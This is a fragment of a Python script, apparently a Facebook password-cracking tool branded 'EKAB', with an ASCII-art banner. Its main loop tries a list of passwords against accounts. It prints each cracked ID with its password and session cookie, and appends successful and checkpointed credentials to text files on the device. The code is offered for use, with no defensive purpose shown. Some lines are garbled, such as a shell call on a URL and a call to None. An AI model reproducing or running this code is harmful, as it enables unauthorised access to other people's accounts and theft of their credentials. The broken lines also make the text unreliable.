...
logo = (""""\033[132m
d88888b db   dD  .d8b.  d8888b. 
88'     88 ,8P' d8' `8b 88  `8D 
88ooooo 88,8P   88ooo88 88oooY' 
88~~~~~ 88`8b   88~~~88 88~~~b. 
88.     88 `88. 88   88 88   8D 
Y88888P YP   YD YP   YP Y8888P' 
...
def FD():
    ...
    if opt == '1':
        os.system('https://www.facebook.com/profile.php?id=100042314315804')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[EKAB-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/EKAB-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[EKAB-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/EKAB-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[EKAB] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
